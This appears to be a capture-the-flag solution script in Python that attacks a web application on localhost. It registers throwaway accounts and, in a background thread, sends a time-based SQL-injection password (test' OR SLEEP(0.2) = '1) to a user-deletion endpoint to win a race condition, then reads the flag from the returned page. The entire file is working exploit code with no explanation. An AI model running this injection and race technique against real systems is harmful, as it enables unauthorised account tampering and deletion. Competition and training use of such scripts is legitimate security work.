from requests import Session, post
from os import urandom
from bs4 import BeautifulSoup
import threading
from time import sleep

s = Session()

BASE_URL = 'http://localhost:3000'


def delete_user(password):
    print(s.post(BASE_URL + '/user/delete', data={'password': password}).url)


print(post(BASE_URL + '/register',
      data={'username': urandom(6).hex(), 'password': 'test'}).url)

print(s.post(BASE_URL + '/register',
      data={'username': urandom(6).hex(), 'password': 'test'}).url)

try:
    threading.Thread(target=delete_user, args=(
        'test\' OR SLEEP(0.2) = \'1',)).start()
except:
    print("Error: unable to start thread")

print('sleeping...')

sleep(4.5)

print('getting note')

fin = s.get(BASE_URL)
soup = BeautifulSoup(fin.text, 'html.parser')
print('flag:' + soup.find('h1').text)
print(fin.url)
